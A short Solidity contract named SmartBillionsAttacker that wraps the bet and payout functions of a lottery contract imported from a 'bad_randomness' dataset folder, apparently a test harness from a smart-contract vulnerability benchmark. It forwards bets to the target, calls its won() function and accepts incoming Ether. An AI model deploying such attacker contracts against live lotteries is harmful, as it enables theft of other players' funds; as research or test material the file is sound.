pragma solidity ^0.4.13;

import "../dataset/bad_randomness/smart_billions.sol";

contract SmartBillionsAttacker {

    SmartBillions target;

    function SmartBillionsAttacker(address _target) {
        target = SmartBillions(_target);
    }

    function play(uint bet) payable{
        target.playSystem.value(msg.value)(bet, address(0));
    }

    function won() public {
        target.won();
    }

    function() payable {
    }


}